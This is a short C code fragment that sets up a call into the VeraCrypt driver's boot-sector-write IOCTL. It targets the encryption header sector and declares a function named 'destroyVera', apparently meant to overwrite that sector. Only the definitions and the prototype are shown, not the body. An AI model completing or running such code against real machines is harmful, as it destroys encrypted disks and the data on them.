#include <windows.h>
#include <stdio.h>
#define WIN32_ROOT_PREFIX L"\\\\.\\VeraCrypt"
#define TC_IOCTL(CODE) (CTL_CODE (FILE_DEVICE_UNKNOWN, 0x800 + (CODE), METHOD_BUFFERED, FILE_ANY_ACCESS))
#define TC_IOCTL_WRITE_BOOT_DRIVE_SECTOR TC_IOCTL (34)
#define TC_SECTOR_SIZE_BIOS	512
#define VERACRYPT_HEADER_SECTOR 62

typedef struct
{
	LARGE_INTEGER Offset;
	byte Data[TC_SECTOR_SIZE_BIOS];
} WriteBootDriveSectorRequest;

void destroyVera(LONGLONG sector, int value);